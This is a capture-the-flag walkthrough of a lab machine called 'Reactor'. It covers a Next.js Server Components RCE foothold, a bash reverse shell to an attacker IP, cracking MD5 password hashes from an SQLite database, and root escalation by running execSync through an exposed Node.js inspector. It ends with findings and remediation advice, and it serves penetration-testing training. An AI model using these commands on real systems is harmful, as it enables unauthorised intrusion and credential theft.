# Reactor

##

> **Box:** Reactor  |  **OS:** Linux (Ubuntu 24.04)  |  **Difficulty:** Easy  |  **Season 11** **Techniques:** Next.js / React Server Components RCE → SQLite credential recovery → SSH lateral movement → Node.js V8 Inspector privesc

\{% hint style="info" %\} **CVE caveat:** Public writeups disagree on the foothold CVE. Most label it **CVE-2025-55182 ("React2Shell")** in React Server Components; a few cite CVE-2025-66478. Confirm against the official machine info before citing a number. \{% endhint %\}

***

### Attack Path

```
nmap → port 3000 Next.js
   ↓
React Server Components RCE  (unauthenticated)  →  shell as 'node'
   ↓
loot SQLite DB  →  MD5 hash  →  crack  →  password
   ↓
SSH as 'engineer'
   ↓
root-owned node --inspect=127.0.0.1:9229  →  execSync() as root  →  root.txt
```

***

### 1. Reconnaissance

A full TCP service scan shows only SSH and a web app on 3000.

```bash
nmap -Pn -p- --min-rate 2000 10.129.245.214          # full sweep
nmap -Pn -p22,3000 -sCV 10.129.245.214               # targeted
```

Key output:

```
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
3000/tcp open  ppp?
|   GetRequest:
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     X-Powered-By: Next.js
```

**Reading the fingerprint:** `X-Powered-By: Next.js` plus the `RSC` / `Next-Router-*` `Vary` headers mean this is a **Next.js app using React Server Components (RSC)** — a feature only in recent Next versions. That narrows the version window and points straight at the RSC RCE class of bugs. The reported `next-server` version in this box's build is **v15.0.3**, which is in the vulnerable range.

\{% hint style="success" %\} `ppp?` is just nmap failing to name the service — it's plain HTTP. Browse to `http://<target>:3000` to see the "ReactorWatch" reactor-monitoring dashboard. \{% endhint %\}

***

### 2. Foothold — React Server Components RCE

**The idea:** Vulnerable Next.js/React versions mishandle deserialization of Server Component / server-action payloads, letting an **unauthenticated** attacker trigger arbitrary command execution server-side. The web process runs as the low-privileged **`node`** user, so that's the shell you land in.

Steps:

1. Identify an RSC / server-action endpoint (the app's action handler).
2. Send the crafted RSC payload that injects a command (use the public React2Shell PoC against the discovered endpoint).
3. Confirm execution, then upgrade to an interactive reverse shell.

```bash
# listener on your Kali box (10.10.17.238 here)
nc -lvnp 9001

# payload command (inside the RCE) — classic bash reverse shell
bash -c 'bash -i >& /dev/tcp/10.10.17.238/9001 0>&1'
```

Verify context:

```bash
id            # uid=1001(node) gid=1001(node) ...
hostname      # reactor
```

\{% hint style="warning" %\} Stabilise the shell before moving on:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl-Z  →  stty raw -echo; fg  →  Enter
```

\{% endhint %\}

***

### 3. Loot — credential recovery from SQLite

The app persists data in a local SQLite database. Find it and dump the users table.

```bash
find / -name '*.db' 2>/dev/null
# e.g. /opt/reactor-app/… /reactor.db

sqlite3 reactor.db '.tables'
sqlite3 reactor.db 'select * from users;'
```

This yields a username and an **MD5** password hash (weak, fast to crack).

```bash
# identify
hashid '<hash>'            # → MD5

# crack
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# or
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
```

\{% hint style="danger" %\} **Root cause note (for the report):** storing passwords as unsalted MD5 is the real finding here — it turns a DB read into instant credential compromise. Flag F-03 in a professional writeup. \{% endhint %\}

The recovered password belongs to **`engineer`**. (Public writeups report `reactor1`; your instance may differ — use what you cracked.)

***

### 4. Lateral Movement — SSH as engineer

```bash
ssh engineer@10.129.245.214
# password: <cracked>

id            # uid=1002(engineer) ...
cat user.txt  # user flag
```

***

### 5. Privilege Escalation — Node.js V8 Inspector abuse

**The idea:** process enumeration reveals a **second** Node process, this one owned by **root**, started with the debug inspector bound to loopback:

```bash
ps aux | grep node
```

```
node   1389  ... next-server (v15.0.3)                              # the web app (node user)
root   1391  ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

`--inspect=127.0.0.1:9229` exposes the **Chrome DevTools Protocol / V8 Inspector** on port 9229. The inspector lets you **execute arbitrary JavaScript inside that process** — and because the process is root, your JS runs as **root**. Port 9229 is the default Node inspector port.

#### 5a. Reach the port

It's bound to `127.0.0.1`, so from your Kali VM tunnel it out through SSH:

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.245.214
```

Grab the debugger session UUID:

```bash
curl http://127.0.0.1:9229/json
# → "webSocketDebuggerUrl": "ws://127.0.0.1:9229/<uuid>"
```

#### 5b. Execute as root

Easiest path (what the screenshots show): open **`chrome://inspect`** in Chromium → **Configure** → add `127.0.0.1:9229` → the `worker.js` target appears → **inspect** → use the DevTools **Console**.

\{% hint style="warning" %\} **The `require` problem:** inside the inspector console, `require` and `exec` are **not** in scope — `exec("…")` throws `ReferenceError: exec is not defined`. Reach the module system through the running module instead: \{% endhint %\}

```js
// run a command and get its output back as a string
process.mainModule.require('child_process').execSync('id').toString()
// → "uid=0(root) gid=0(root) groups=0(root)\n"
```

Read the flag — **use the absolute path**. Each `execSync` is a fresh shell whose CWD is the worker's, not yours; `cat root.txt` on a relative path reads the wrong (or empty) file:

```js
process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()
```

If it's not there:

```js
process.mainModule.require('child_process').execSync('find / -name root.txt 2>/dev/null').toString()
```

#### 5c. (Alt) CLI instead of DevTools

```bash
node inspect 127.0.0.1:9229
# then in the debug REPL:
exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
```

Or script a raw WebSocket client (`Runtime.evaluate`) with only built-in `net` + `crypto` if `wscat` isn't installed.

***

### Findings Summary

| ID   | Finding                                                                                 | Severity |
| ---- | --------------------------------------------------------------------------------------- | -------- |
| F-01 | Unauthenticated RCE in Next.js React Server Components (CVE-2025-55182 / "React2Shell") | Critical |
| F-02 | Root-owned Node.js `--inspect` interface exposed on loopback                            | High     |
| F-03 | Passwords stored as unsalted MD5                                                        | High     |

### Remediation

* **Upgrade Next.js** past the patched RSC version; don't expose server-action endpoints without validation.
* **Never run `--inspect` in production**, especially as root. If debugging is required, scope it to a short-lived, firewalled session as an unprivileged user.
* **Hash with bcrypt/argon2**, salted — never MD5.

### Tooling

`nmap` · `sqlite3` · `hashcat`/`john` · `ssh -L` · `chrome://inspect` / `node inspect` / `wscat`
